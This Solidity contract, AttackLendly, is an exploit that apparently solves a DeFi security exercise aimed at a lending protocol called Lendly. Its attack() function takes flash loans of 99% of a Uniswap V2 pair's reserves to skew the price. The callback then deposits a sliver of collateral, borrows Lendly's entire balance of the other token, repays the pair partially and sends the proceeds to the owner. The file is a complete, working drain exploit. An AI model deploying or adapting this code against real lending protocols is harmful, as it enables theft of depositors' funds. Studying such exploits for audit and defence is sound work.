// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IUniswapV2Pair} from "../interfaces/IUniswapV2.sol";
import {IWETH9} from "../../src/interfaces/IWETH9.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

interface ILendly {
    function deposit(address _token, uint256 _amount) external;
    function borrow(address _token, uint256 _amount) external;
}

contract AttackLendly is Ownable {
    ILendly private immutable lendly;
    IUniswapV2Pair private immutable pair;
    IERC20 private immutable token0;
    IERC20 private immutable token1;
    address private immutable token0Address;
    address private immutable token1Address;
    uint256 private reserve0;
    uint256 private reserve1;

    constructor(address _pair, address _lendly) {
        pair = IUniswapV2Pair(_pair);
        lendly = ILendly(_lendly);
        token0 = IERC20(IUniswapV2Pair(pair).token0());
        token1 = IERC20(IUniswapV2Pair(pair).token1());
        token0Address = IUniswapV2Pair(pair).token0();
        token1Address = IUniswapV2Pair(pair).token1();
    }

    function attack() external onlyOwner {
        // Get the reserves of the pair smart contract
        (reserve0, reserve1,) = pair.getReserves();

        //Flash loan 99% DAI liquidity, drain all Lendly ETH
        uint256 wantedLoan = reserve0 * 99 / 100;
        pair.swap(wantedLoan, 0, address(this), abi.encode(token0Address));

        //Get the reserves of the pair smart contract
        // Flash loan 99% WETH liquidity, drain all Lendly DAI
        (reserve0, reserve1,) = pair.getReserves();

        wantedLoan = reserve1 * 99 / 100;
        pair.swap(0, wantedLoan, address(this), abi.encode(token1Address));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Make sure it's a legit callback
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");

        // Extract the token from the data and revert if it's a wrong token
        address token = abi.decode(data, (address));
        require(token == token0Address || token == token1Address, "wrong token");

        uint256 amount = amount0 == 0 ? amount1 : amount0;

        // deposit 0.1% of the amount
        uint256 depositAmount = amount * 1 / 1000;
        IERC20(token).approve(address(lendly), depositAmount);
        lendly.deposit(address(token), depositAmount);

        // determine other token address
        IERC20 otherToken;
        uint256 otherTokenReserve;

        if (token == token0Address) {
            otherToken = token1;
            otherTokenReserve = reserve1;
        } else {
            otherToken = token0;
            otherTokenReserve = reserve0;
        }

        // Borrow all the other token
        uint256 lendlyBalance = otherToken.balanceOf(address(lendly));
        lendly.borrow(address(otherToken), lendlyBalance);

        // Pay back only 99.9%
        uint256 tokenPaymentAmount = amount * 999 / 1000;

        // Amount to pay in the other token OtherToken Reserve * 4 / 1000
        uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;

        IERC20(token).transfer(address(pair), tokenPaymentAmount);
        IERC20(otherToken).transfer(address(pair), otherTokenPaymentAmount);

        withdrawProfit();
    }

    function withdrawProfit() internal {
        token0.transfer(owner(), token0.balanceOf(address(this)));
        token1.transfer(owner(), token1.balanceOf(address(this)));
    }
}
